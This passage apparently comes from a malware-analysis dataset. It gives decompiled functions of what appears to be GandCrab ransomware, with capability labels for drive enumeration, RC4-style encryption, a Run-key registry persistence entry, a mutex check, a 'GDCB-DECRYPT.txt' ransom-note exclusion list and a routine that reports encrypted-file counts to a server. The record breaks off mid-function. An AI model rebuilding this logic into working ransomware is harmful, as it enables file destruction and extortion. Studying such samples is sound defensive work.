        "decompiled_code": "\nint16_t * __fastcall fcn.00407ba0(int16_t *param_1, int16_t *param_2)\n\n{\n    int16_t iVar1;\n    int16_t *piVar2;\n    int32_t iVar3;\n    \n    if (*param_2 == 0) {\n        return param_1;\n    }\n    iVar1 = *param_1;\n    if (iVar1 != 0) {\n        iVar3 = param_1 - param_2;\n        piVar2 = param_2;\njoined_r0x00407bc5:\n        do {\n            if (iVar1 != 0) {\n                if (*piVar2 == 0) {\n                    return param_1;\n                }\n                if (*(iVar3 + piVar2) == *piVar2) {\n                    iVar1 = *(iVar3 + piVar2 + 1);\n                    piVar2 = piVar2 + 1;\n                    goto joined_r0x00407bc5;\n                }\n            }\n            if (*piVar2 == 0) {\n                return param_1;\n            }\n            iVar1 = param_1[1];\n            param_1 = param_1 + 1;\n            iVar3 = iVar3 + 2;\n            piVar2 = param_2;\n        } while (iVar1 != 0);\n    }\n    return NULL;\n}\n",
        "token_count": 291
    },
    "00407c10": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nchar * __fastcall fcn.00407c10(char *param_1, char *param_2)\n\n{\n    char cVar1;\n    char *pcVar2;\n    int32_t iVar3;\n    \n    cVar1 = *param_1;\n    if (cVar1 != '\\0') {\n        iVar3 = param_1 - param_2;\n        pcVar2 = param_2;\njoined_r0x00407c25:\n        do {\n            if (cVar1 != '\\0') {\n                if (*pcVar2 == '\\0') {\n                    return param_1;\n                }\n                if (pcVar2[iVar3] == *pcVar2) {\n                    cVar1 = (pcVar2 + 1)[iVar3];\n                    pcVar2 = pcVar2 + 1;\n                    goto joined_r0x00407c25;\n                }\n            }\n            if (*pcVar2 == '\\0') {\n                return param_1;\n            }\n            cVar1 = param_1[1];\n            param_1 = param_1 + 1;\n            iVar3 = iVar3 + 1;\n            pcVar2 = param_2;\n        } while (cVar1 != '\\0');\n    }\n    return NULL;\n}\n",
        "token_count": 268
    },
    "00403de0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403de0(uint param_1)\n\n{\n    ushort *puVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    uint32_t *puVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint16_t uVar9;\n    uint32_t unaff_EDI;\n    bool bVar10;\n    int32_t iVar11;\n    uint32_t uVar12;\n    uint32_t uStack952;\n    uint32_t uStack948;\n    uint32_t uStack944;\n    uint uStack940;\n    uint auStack928 [64];\n    uint32_t auStack672 [6];\n    uint32_t auStack648 [161];\n    \n    puVar1 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, 0x18, 0x3000, 4);\n    *(puVar1 + 2) = param_1;\n    uVar7 = 0;\n    *puVar1 = 0x43;\n    uStack944 = *0x40e304;\n    uStack940 = *0x40e308;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n    puVar5 = auStack672 + 2;\n    uVar9 = 0x41;\n    do {\n        uStack944 = uStack944 & 0xffff0000 | uVar9;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetDriveTypeW)(&uStack944);\n        if ((1 < uVar3) && (uVar3 != 5)) {\n            puVar5[-1] = unaff_EDI;\n            *(puVar5 + -2) = uVar9;\n            *puVar5 = 0;\n            puVar5[2] = 0;\n            puVar5[3] = 0;\n            uVar4 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00406840, puVar5 + -2);\n            auStack928[uVar7] = uVar4;\n            uVar7 = uVar7 + 1;\n            puVar5 = puVar5 + 6;\n        }\n        uVar9 = uVar9 + 1;\n    } while (uVar9 < 0x5b);\n    uVar12 = 0;\n    iVar11 = 0;\n    (*_sym.imp.KERNEL32.dll_WaitForMultipleObjects)(uVar7, auStack928, 1);\n    (*_sym.imp.KERNEL32.dll_GetTickCount)();\n    uVar3 = 0;\n    uVar8 = uVar7;\n    if (1 < uVar7) {\n        puVar5 = auStack648;\n        iVar6 = (uVar7 - 2 >> 1) + 1;\n        uVar3 = iVar6 * 2;\n        do {\n            bVar10 = CARRY4(uVar12, puVar5[-6]);\n            uVar12 = uVar12 + puVar5[-6];\n            uVar7 = uVar7 + puVar5[-5] + bVar10;\n            bVar10 = CARRY4(unaff_EDI, *puVar5);\n            unaff_EDI = unaff_EDI + *puVar5;\n            iVar11 = iVar11 + puVar5[1] + bVar10;\n            puVar5 = puVar5 + 0xc;\n            iVar6 = iVar6 + -1;\n            uVar8 = uVar2;\n        } while (iVar6 != 0);\n    }\n    if (uVar3 < uVar8) {\n        uStack952 = auStack672[uVar3 * 6];\n        uStack948 = auStack672[uVar3 * 6 + 1];\n    }\n    else {\n        uStack948 = 0;\n        uStack952 = 0;\n    }\n    fcn.00405540(unaff_EDI + uVar12 + uStack952, \n                 iVar11 + uVar7 + CARRY4(unaff_EDI, uVar12) + uStack948 + CARRY4(unaff_EDI + uVar12, uStack952));\n    return;\n}\n",
        "token_count": 930
    },
    "00402f50": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nuint32_t fcn.00402f50(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint lpBaseName;\n    uint lpString2;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    pcVar1 = _sym.imp.PSAPI.DLL_EnumDeviceDrivers;\n    var_4h = 0;\n    (*_sym.imp.PSAPI.DLL_EnumDeviceDrivers)(&var_8h, 4, &var_4h);\n    if (var_4h == 0) {\n        return var_4h;\n    }\n    iVar2 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, var_4h, 0x3000, 4);\n    if (iVar2 != 0) {\n        iVar3 = (*pcVar1)(iVar2, var_4h, &var_8h);\n        if (iVar3 != 0) {\n            iVar3 = 0;\n            uVar5 = var_4h >> 2;\n            if (uVar5 != 0) {\n                do {\n                    iVar4 = (*_sym.imp.PSAPI.DLL_GetDeviceDriverBaseNameW)(*(iVar2 + iVar3 * 4), &lpBaseName, 0x400);\n                    if ((iVar4 != 0) &&\n                       (iVar4 = (*_sym.imp.KERNEL32.dll_lstrcmpiW)(&lpBaseName, lpString2),  iVar4 == 0)) {\n                        (*_sym.imp.KERNEL32.dll_VirtualFree)(iVar2, 0, 0x8000);\n                        return 1;\n                    }\n                    iVar3 = iVar3 + 1;\n                } while (iVar3 < uVar5);\n            }\n        }\n        (*_sym.imp.KERNEL32.dll_VirtualFree)(iVar2, 0, 0x8000);\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 446
    },
    "00404550": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00404550(uint param_1)\n\n{\n    uint32_t uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint uVar6;\n    uint in_stack_ffffff0c;\n    uint in_stack_ffffff10;\n    uint in_stack_ffffff14;\n    uint in_stack_ffffff3c;\n    uint in_stack_ffffff40;\n    uint in_stack_ffffff44;\n    \n    fcn.004039b0(0, param_1, 0, in_stack_ffffff0c, in_stack_ffffff10, in_stack_ffffff14, 0, param_1, 0, param_1, 0, \n                 param_1, 0, param_1, 0, in_stack_ffffff3c, in_stack_ffffff40, in_stack_ffffff44, 0, param_1, 0);\n    fcn.00406d90();\n    iVar3 = fcn.00406ba0();\n    uVar1 = iVar3 * 2 + 0x42;\n    iVar4 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, uVar1, 0x3000, 0x40);\n    if ((iVar4 == 0) || (iVar5 = iVar4,  uVar1 <= iVar3 * 2 + 0x40U)) {\n        iVar5 = 0;\n    }\n    (*_sym.imp.KERNEL32.dll_lstrcpyW)(iVar5, L\"Global\\\\\");\n    iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenW)(iVar5);\n    fcn.004069a0(iVar5 + iVar3 * 2);\n    (*_sym.imp.KERNEL32.dll_CreateMutexW)(0, 0, iVar5);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetLastError;\n    iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    if ((iVar3 == 5) || (iVar3 = (*pcVar2)(),  iVar3 == 0xb7)) {\n        uVar6 = 1;\n    }\n    else {\n        uVar6 = 0;\n    }\n    (*_sym.imp.KERNEL32.dll_VirtualFree)(iVar4, 0, 0x8000);\n    fcn.00407720();\n    return uVar6;\n}\n",
        "token_count": 524
    },
    "00405540": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nbool __cdecl fcn.00405540(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint noname_1;\n    uint32_t uVar7;\n    char *pcVar8;\n    uint in_stack_fffffde0;\n    uint in_stack_fffffde4;\n    uint in_stack_fffffde8;\n    uint uVar9;\n    char16_t *noname_17;\n    uint var_1afh;\n    uint var_b0h;\n    uint lpString;\n    uint var_18h;\n    uint var_14h;\n    int32_t pcchString;\n    int32_t var_ch;\n    char *var_8h;\n    char *pbBinary;\n    \n    var_ch = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, 0x4c02, 0x3000, 0x40);\n    if (var_ch == 0) {\n        iVar4 = 0;\n        iVar6 = 0;\n    }\n    else {\n        iVar6 = var_ch + 0x800;\n        iVar4 = var_ch;\n    }\n    noname_17 = L\"action=result&e_files=%d&e_size=%I64u&e_time=%d&\";\n    uVar9 = 0x405593;\n    iVar3 = iVar4;\n    pbBinary = iVar4;\n    (*_sym.imp.USER32.dll_wsprintfW)(iVar4, L\"action=result&e_files=%d&e_size=%I64u&e_time=%d&\", var_8h, arg_8h, arg_ch)\n    ;\n    fcn.004039b0(0, noname_1, 0, in_stack_fffffde0, in_stack_fffffde4, in_stack_fffffde8, 0, noname_1, 0, noname_1, 0, \n                 noname_1, 0, noname_1, 0, uVar9, iVar3, noname_17, 0, noname_1, 0);\n    fcn.00406d90();\n    fcn.00406ba0();\n    pcVar2 = _sym.imp.KERNEL32.dll_lstrlenW;\n    iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenW)(iVar4);\n    fcn.004069a0(iVar4 + iVar3 * 2);\n    iVar4 = (*pcVar2)(iVar4);\n    var_18h = str.aeriedjDshasj._8_4_;\n    var_14h._0_2_ = str.aeriedjDshasj._12_2_;\n    _lpString = str.aeriedjDshasj._0_8_;\n    var_14h._2_1_ = str.aeriedjDshasj[14];\n    fcn.00408b30(&fcn.00405540::var_1afh, 0, 0xff);\n    uVar9 = (*_sym.imp.KERNEL32.dll_lstrlenA)(&fcn.00405540::lpString);\n    fcn.00405c40(uVar9);\n    fcn.00405cf0(iVar4 * 2);\n    pcchString = iVar4 * 8;\n    iVar4 = (*_sym.imp.CRYPT32.dll_CryptBinaryToStringA)(pbBinary, iVar4 * 2, 0x40000001, iVar6, &stack0xffffffec);\n    if (iVar4 == 0) {\n        (*_sym.imp.KERNEL32.dll_GetLastError)();\n    }\n    pcVar2 = _sym.imp.KERNEL32.dll_lstrlenA;\n    iVar4 = (*_sym.imp.KERNEL32.dll_lstrlenA)(iVar6);\n    var_8h = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, iVar4 + 4U, 0x3000, 0x40);\n    iVar3 = (*pcVar2)(iVar6);\n    if ((var_8h == NULL) || (pbBinary = var_8h,  iVar4 + 4U <= iVar3 + 2U)) {\n        pbBinary = NULL;\n    }\n    uVar7 = 0;\n    iVar4 = (*pcVar2)(iVar6);\n    pcVar8 = pbBinary;\n    if (iVar4 != 0) {\n        do {\n            cVar1 = *(uVar7 + iVar6);\n            if ((cVar1 != '\\n') && (cVar1 != '\\r')) {\n                *pcVar8 = cVar1;\n                pcVar8 = pcVar8 + 1;\n            }\n            uVar7 = uVar7 + 1;\n            uVar5 = (*_sym.imp.KERNEL32.dll_lstrlenA)(iVar6);\n        } while (uVar7 < uVar5);\n    }\n    iVar6 = fcn.00405370(0);\n    pcVar2 = _sym.imp.KERNEL32.dll_VirtualFree;\n    (*_sym.imp.KERNEL32.dll_VirtualFree)(var_8h, 0, 0x8000);\n    fcn.00407720();\n    (*pcVar2)(var_ch, 0, 0x8000);\n    return iVar6 != 0;\n}\n",
        "token_count": 1189
    },
    "004063b0": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nulong __cdecl fcn.004063b0(uint noname_0, uint arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t in_EDX;\n    ulong uVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, 0x400, 0x3000, 0x40);\n    (*_sym.imp.USER32.dll_wsprintfW)(uVar1, 0x410330);\n    iVar2 = fcn.00406300();\n    if (((iVar2 == 0) || (*(in_EDX + 0x20) < 10)) || (iVar2 = fcn.00406240(),  iVar2 != 0)) {\n        uVar3 = 0;\n    }\n    else {\n        uVar3 = fcn.004035e0();\n    }\n    (*_sym.imp.KERNEL32.dll_VirtualFree)(uVar1, 0, 0x8000);\n    return uVar3;\n}\n",
        "token_count": 237
    },
    "00405c40": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405c40(uint32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    uint8_t *in_ECX;\n    uint32_t uVar2;\n    int32_t in_EDX;\n    uint32_t uVar3;\n    uint8_t *puVar4;\n    uint8_t var_110h;\n    uint var_10fh;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint8_t *var_8h;\n    int32_t var_4h;\n    \n    var_10h = 0;\n    var_110h = 0;\n    var_ch = in_EDX;\n    var_8h = in_ECX;\n    fcn.00408b30(&var_10fh, 0, 0xff);\n    uVar2 = 0;\n    do {\n        puVar4 = &var_110h + uVar2;\n        uVar3 = uVar2 % arg_8h;\n        puVar4[in_ECX - &var_110h] = uVar2;\n        uVar2 = uVar2 + 1;\n        *puVar4 = *(uVar3 + var_ch);\n    } while (uVar2 < 0x100);\n    var_4h = 0x100;\n    puVar4 = var_8h;\n    do {\n        uVar1 = *puVar4;\n        var_10h = var_10h + puVar4[&var_110h + -var_8h] + uVar1 & 0x800000ff;\n        if (var_10h < 0) {\n            var_10h = (var_10h - 1 | 0xffffff00) + 1;\n        }\n        *puVar4 = var_8h[var_10h];\n        puVar4 = puVar4 + 1;\n        var_4h = var_4h + -1;\n        var_8h[var_10h] = uVar1;\n    } while (var_4h != 0);\n    return;\n}\n",
        "token_count": 460
    },
    "00405cf0": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00405d54)\n\nvoid __cdecl fcn.00405cf0(uint32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar3 = 0;\n    uVar4 = 0;\n    if (arg_8h != 0) {\n        uVar2 = 0;\n        do {\n            uVar3 = uVar3 + 1 & 0x800000ff;\n            if (uVar3 < 0) {\n                uVar3 = (uVar3 - 1 | 0xffffff00) + 1;\n            }\n            uVar1 = *(uVar3 + in_ECX);\n            uVar4 = uVar4 + uVar1 & 0x800000ff;\n            if (uVar4 < 0) {\n                uVar4 = (uVar4 - 1 | 0xffffff00) + 1;\n            }\n            *(uVar3 + in_ECX) = *(uVar4 + in_ECX);\n            *(uVar4 + in_ECX) = uVar1;\n            *(uVar2 + in_EDX) = *(uVar2 + in_EDX) ^ *((*(uVar3 + in_ECX) + uVar1 & 0x800000ff) + in_ECX);\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < arg_8h);\n    }\n    return;\n}\n",
        "token_count": 375
    },
    "00406840": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406840(ushort *arg_8h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uint uStack68;\n    \n    uStack68 = 0x40;\n    uVar2 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, 0x401, 0x3000);\n    (*_sym.imp.USER32.dll_wsprintfW)(uVar2, 0x4103a0, *arg_8h);\n    (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)(&uStack68);\n    (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, 40000, 0x3000, 4);\n    fcn.004066f0(*(arg_8h + 2), arg_8h + 4, arg_8h + 8);\n    (*_sym.imp.KERNEL32.dll_VirtualFree)(arg_8h, 0, 0x8000);\n    (*_sym.imp.KERNEL32.dll_ExitThread)(0);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 250
    },
    "004068f0": {
        "rules": [
            "decompress data using aPLib/db7317f0dd944ab688d24dced6f5a7c2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004068f0(uint ARG_0)\n\n{\n    uint arg_18h;\n    int32_t iVar1;\n    uint uVar2;\n    uint in_stack_ffffffc4;\n    uint in_stack_ffffffc8;\n    uint var_8h;\n    int32_t var_4h;\n    \n    uVar2 = 0;\n    fcn.004077f0();\n    arg_18h = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, 0x2801, 0x3000, 0x40);\n    (*_sym.imp.KERNEL32.dll_lstrlenW)(0x4103ac);\n    iVar1 = fcn.00407a00(0x4103b4, 0x4103b0, 0, 0, arg_18h, 0x27ff, in_stack_ffffffc4, in_stack_ffffffc8, 0x40ff24, 0, 0\n                        );\n    if (iVar1 != 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_lstrlenA)(arg_18h);\n        if (iVar1 * 2 < 0x80) {\n            (*_sym.imp.USER32.dll_wsprintfW)(ARG_0, 0x40ff64, arg_18h);\n            uVar2 = 1;\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_VirtualFree)(arg_18h, 0, 0x8000);\n    if (var_4h != 0) {\n        (*_sym.imp.WININET.dll_InternetCloseHandle)(var_4h);\n    }\n    return uVar2;\n}\n",
        "token_count": 371
    },
    "00406240": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nbool __fastcall fcn.00406240(int32_t param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int16_t *piVar4;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_lstrlenW;\n    iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenW)(param_1);\n    iVar3 = (*pcVar1)(param_1);\n    pcVar1 = _sym.imp.KERNEL32.dll_lstrcmpiW;\n    piVar4 = param_1 + -2 + iVar3 * 2;\n    do {\n        iVar2 = iVar2 + -1;\n        if (iVar2 == 0) break;\n        piVar4 = piVar4 + -1;\n    } while (*piVar4 != 0x5c);\n    piVar4 = piVar4 + 1;\n    iVar2 = (*_sym.imp.KERNEL32.dll_lstrcmpiW)(piVar4, L\"desktop.ini\");\n    if (((((iVar2 != 0) && (iVar2 = (*pcVar1)(piVar4, L\"autorun.inf\"),  iVar2 != 0)) &&\n         (iVar2 = (*pcVar1)(piVar4, L\"ntuser.dat\"),  iVar2 != 0)) &&\n        ((iVar2 = (*pcVar1)(piVar4, L\"iconcache.db\"),  iVar2 != 0 &&\n         (iVar2 = (*pcVar1)(piVar4, L\"bootsect.bak\"),  iVar2 != 0)))) &&\n       ((iVar2 = (*pcVar1)(piVar4, L\"boot.ini\"),  iVar2 != 0 &&\n        ((iVar2 = (*pcVar1)(piVar4, L\"ntuser.dat.log\"),  iVar2 != 0 &&\n         (iVar2 = (*pcVar1)(piVar4, L\"thumbs.db\"),  iVar2 != 0)))))) {\n        iVar2 = (*pcVar1)(piVar4, L\"GDCB-DECRYPT.txt\");\n        return iVar2 == 0;\n    }\n    return true;\n}\n",
        "token_count": 462
    },
    "00402960": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open registry key",
            "set registry value"
        ],
        "decompiled_code": "\nbool __fastcall fcn.00402960(uint param_1)\n\n{\n    int32_t iVar1;\n    uint lpSubKey;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint lpValueName;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint hKey;\n    \n    lpValueName = 0x520050;\n    var_18h = 0x440049;\n    var_14h = 0x520055;\n    var_10h = 0x530041;\n    var_ch = 0x4b0048;\n    var_8h = 0x41;\n    (*_sym.imp.KERNEL32.dll_lstrlenW)(&lpValueName, 0x41);\n    fcn.00407c60();\n    lpSubKey = 0x4f0053;\n    var_84h = 0x540046;\n    var_80h = 0x410057;\n    var_7ch = 0x450052;\n    var_78h = 0x4d005c;\n    var_74h = 0x630069;\n    var_70h = 0x6f0072;\n    var_6ch = 0x6f0073;\n    var_68h = 0x740066;\n    var_64h = 0x57005c;\n    var_60h = 0x6e0069;\n    var_5ch = 0x6f0064;\n    var_58h = 0x730077;\n    var_54h = 0x43005c;\n    var_50h = 0x720075;\n    var_4ch = 0x650072;\n    var_48h = 0x74006e;\n    var_44h = 0x650056;\n    var_40h = 0x730072;\n    var_3ch = 0x6f0069;\n    var_38h = 0x5c006e;\n    var_34h = 0x750052;\n    var_30h = 0x4f006e;\n    var_2ch = 0x63006e;\n    var_28h = 0x65;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegCreateKeyExW)(0x80000001, &lpSubKey, 0, 0, 0, 0xf003f, 0, &hKey, 0);\n    if (iVar1 == 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)(param_1);\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegSetValueExW)(hKey, &lpValueName, 0, 1, param_1, iVar1 * 2);\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n        return iVar1 == 0;\n    }\n    return false;\n}\n",
        "token_count": 823
    },
    "004032b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.004032b0(int32_t param_1)\n\n{\n    char *pcVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint var_4h;\n    \n    iVar4 = 0;\n    iVar6 = 0;\n    uVar5 = 0;\n    iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenA)(*(param_1 + 0xc));\n    if (iVar2 != 0) {\n        do {\n            iVar2 = *(param_1 + 0xc);\n            iVar6 = iVar6 + (*(iVar2 + uVar5) == '{');\n            pcVar1 = iVar2 + uVar5;\n            uVar5 = uVar5 + 1;\n            iVar4 = iVar4 + (*pcVar1 == '}');\n            uVar3 = (*_sym.imp.KERNEL32.dll_lstrlenA)(iVar2);\n        } while (uVar5 < uVar3);\n        if (iVar6 != 0) {\n            return iVar6 == iVar4;\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 263
    },
    "00403500": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403500(uint32_t **arg_8h, uint arg_ch, uint32_t *arg_10h, uint32_t *arg_14h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t *puVar4;\n    uint32_t *in_ECX;\n    uint32_t *puVar5;\n    uint32_t in_EDX;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint var_4h;\n    \n    *arg_8h = arg_14h;\n    if ((arg_10h + 0xfU < in_ECX) || (in_ECX + 0xfU < arg_10h)) {\n        uVar1 = arg_10h[1];\n        uVar2 = arg_10h[2];\n        uVar3 = arg_10h[3];\n        *in_ECX = *in_ECX ^ *arg_10h;\n        in_ECX[1] = in_ECX[1] ^ uVar1;\n        in_ECX[2] = in_ECX[2] ^ uVar2;\n        in_ECX[3] = in_ECX[3] ^ uVar3;\n    }\n    else {\n        iVar6 = 0x10;\n        puVar5 = in_ECX;\n        do {\n            *puVar5 = *puVar5 ^ *((arg_10h - in_ECX) + puVar5);\n            iVar6 = iVar6 + -1;\n            puVar5 = puVar5 + 1;\n        } while (iVar6 != 0);\n    }\n    if (0x10 < in_EDX) {\n        iVar6 = (in_EDX - 0x11 >> 4) + 1;\n        puVar5 = arg_14h;\n        puVar4 = in_ECX;\n        do {\n            fcn.00401020(puVar4, puVar5, arg_ch);\n            in_ECX = puVar4 + 4;\n            arg_14h = puVar5 + 4;\n            if ((puVar5 + 0xfU < in_ECX) || (puVar4 + 0x1fU < puVar5)) {\n                uVar1 = puVar5[1];\n                uVar2 = puVar5[2];\n                uVar3 = puVar5[3];\n                *in_ECX = *in_ECX ^ *puVar5;\n                puVar4[5] = puVar4[5] ^ uVar1;\n                puVar4[6] = puVar4[6] ^ uVar2;\n                puVar4[7] = puVar4[7] ^ uVar3;\n            }\n            else {\n                iVar7 = 0x10;\n                puVar4 = in_ECX;\n                do {\n                    *puVar4 = *puVar4 ^ *(puVar4 + (puVar5 - in_ECX));\n                    iVar7 = iVar7 + -1;\n                    puVar4 = puVar4 + 1;\n                } while (iVar7 != 0);\n            }\n            iVar6 = iVar6 + -1;\n            puVar5 = arg_14h;\n            puVar4 = in_ECX;\n        } while (iVar6 != 0);\n    }\n    fcn.00401020(in_ECX, arg_14h, arg_ch);\n    return 1;\n}\n",
        "token_count": 755
    },
    "00403ae0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get OS version"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nbool fcn.00403ae0(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    ulong uVar3;\n    uint lpVersionInformation;\n    uint var_11ch;\n    uint var_118h;\n    uint var_114h;\n    uint var_110h;\n    uint var_10ch;\n    uint32_t var_ch;\n    uint var_8h;\n    \n    lpVersionInformation = 0x11c;\n    var_10ch._0_2_ = 0;\n    var_11ch = 0;\n    var_118h = 0;\n    var_114h = 0;\n    var_110h = 0;\n    fcn.00408b30(&var_10ch + 2, 0, 0xfe);\n    pcVar1 = _sym.imp.KERNEL32.dll_VerSetConditionMask;\n    var_ch = 0;\n    var_8h = 0;\n    uVar3 = (*_sym.imp.KERNEL32.dll_VerSetConditionMask)(0, 0, 2, 3, 1, 3, 0x20, 3);\n    uVar3 = (*pcVar1)(uVar3);\n    uVar3 = (*pcVar1)(uVar3);\n    var_11ch = 6;\n    var_118h = 0;\n    var_ch = var_ch & 0xffff0000;\n    iVar2 = (*_sym.imp.KERNEL32.dll_VerifyVersionInfoW)(&lpVersionInformation, 0x23, uVar3);\n    return iVar2 != 0;\n}\n",
        "token_count": 362
    },
    "00403ba0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "allocate memory",
            "allocate RWX memory",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251"
        ],
        "decompiled_code": "\nvoid fcn.00403ba0(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint uVar4;\n    uint32_t uVar5;\n    uint uStack1720;\n    uchar *puStack1716;\n    uchar *puStack1712;\n    uint uStack1708;\n    uint uStack1680;\n    uint uStack1676;\n    uint uStack1672;\n    uint uStack1668;\n    uint uStack1664;\n    uint uStack1660;\n    uint uStack1656;\n    uint uStack1652;\n    uint uStack1648;\n    uint uStack1644;\n    uint uStack1640;\n    uint uStack1636;\n    uint uStack1632;\n    uint uStack1628;\n    uint uStack1624;\n    uint uStack1620;\n    uint uStack1616;\n    uint uStack1612;\n    uint uStack1608;\n    uint uStack1604;\n    uint uStack1600;\n    uint uStack1596;\n    uint uStack1592;\n    uint uStack1588;\n    uint uStack1584;\n    uint uStack1580;\n    uint uStack1576;\n    uint uStack1572;\n    uint uStack1568;\n    uint uStack1564;\n    uchar auStack1544 [484];\n    uchar auStack1060 [16];\n    uchar auStack1044 [1040];\n    \n    uStack1708 = 0x403bb6;\n    iVar2 = fcn.00403ae0();\n    if (iVar2 != 0) 